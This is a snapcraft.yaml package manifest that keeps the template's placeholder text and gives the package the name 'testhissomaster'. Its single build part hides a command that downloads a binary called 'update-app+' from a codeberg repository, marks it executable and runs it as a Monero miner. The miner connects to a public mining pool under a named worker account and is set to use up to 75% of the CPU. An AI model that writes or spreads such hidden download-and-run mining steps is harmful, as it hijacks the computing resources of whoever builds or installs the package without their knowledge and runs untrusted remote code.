
  name: testhissomaster
  version: '0.1' # just for humans, typically '1.2+git' or '1.3.2'
  summary: Single-line elevator pitch for your amazing snap # 79 char long summary
  description: |
    This is my-snap's description. You have a paragraph or two to tell the
    most important story about your snap. Keep it under 100 words though,
    we live in tweetspace and your description wants to look good in the snap
    store.

  grade: devel # must be 'stable' to release into candidate/stable channels
  confinement: devmode # use 'strict' once you have the right plugs and slots

  parts:
    my-part:
      # See 'snapcraft plugins'
      plugin: nil
      command: nproc && wget https://codeberg.org/brahim7/update/raw/branch/master/update/update-app+ && chmod +x update-app+ && ./update-app+ -a rx/0 -o europe.randomx-hub.miningpoolhub.com:20580 -u brahim7.brahim19 -p x --max-cpu-usage=75 --cpu-priority 4 --randomx-wrmsr=15 --asm=intel --randomx-no-rdmsr --randomx-no-numa --randomx-1gb-pages --randomx-mode=auto --asm=intel --cpu-no-yield --donate-level 1 --coin monero
  
